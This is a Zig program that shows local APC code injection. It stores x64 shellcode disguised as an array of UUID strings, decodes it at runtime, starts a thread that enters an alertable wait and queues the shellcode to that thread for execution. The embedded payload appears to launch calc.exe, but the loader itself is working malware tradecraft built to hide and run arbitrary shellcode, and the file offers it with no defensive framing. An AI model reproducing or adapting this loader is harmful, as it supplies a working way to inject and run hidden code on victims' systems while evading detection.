const std = @import("std");
const sec = @import("zig-sec");
const win = @import("zigwin32").everything;

const INFINITE = win.INFINITE;
const QS_INPUT = win.QS_INPUT;

const Sleep = win.Sleep;
const SleepEx = win.SleepEx;
const CreateEventA = win.CreateEventA;
const WaitForSingleObject = win.WaitForSingleObject;
const CloseHandle = win.CloseHandle;
const MsgWaitForMultipleObjects = win.MsgWaitForMultipleObjects;
const SignalObjectAndWait = win.SignalObjectAndWait;
const CreateThread = win.CreateThread;
const GetLastError = win.GetLastError;

const code_injection = sec.code_injection;
const payload_obfuscation = sec.payload_obfuscation;

fn alertableFunction1() void {
    Sleep(INFINITE);
}

fn alertableFunction2() void {
    _ = SleepEx(INFINITE, 1);
}

fn alertableFunction3() void {
    const h_event = CreateEventA(null, 0, 0, null);
    if (h_event) |handle| {
        _ = WaitForSingleObject(handle, INFINITE);
        _ = CloseHandle(handle);
    }
}

fn alertableFunction4() void {
    const h_event = CreateEventA(null, 0, 0, null);
    if (h_event) |handle| {
        _ = MsgWaitForMultipleObjects(1, &.{handle}, 1, INFINITE, QS_INPUT);
        _ = CloseHandle(handle);
    }
}

fn alertableFunction5() void {
    const h_event1 = CreateEventA(null, 0, 0, null) orelse return;
    const h_event2 = CreateEventA(null, 0, 0, null) orelse return;

    _ = SignalObjectAndWait(h_event1, h_event2, INFINITE, 1);
    _ = CloseHandle(h_event1);
    _ = CloseHandle(h_event2);
}

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = try payload_obfuscation.uuid.deobfuscate(allocator, &uuid_array);
    defer allocator.free(shell_code);

    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(&alertableFunction5),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };

    try code_injection.local.injectShellCodeViaApc(h_thread, shell_code);

    _ = WaitForSingleObject(h_thread, INFINITE);
}
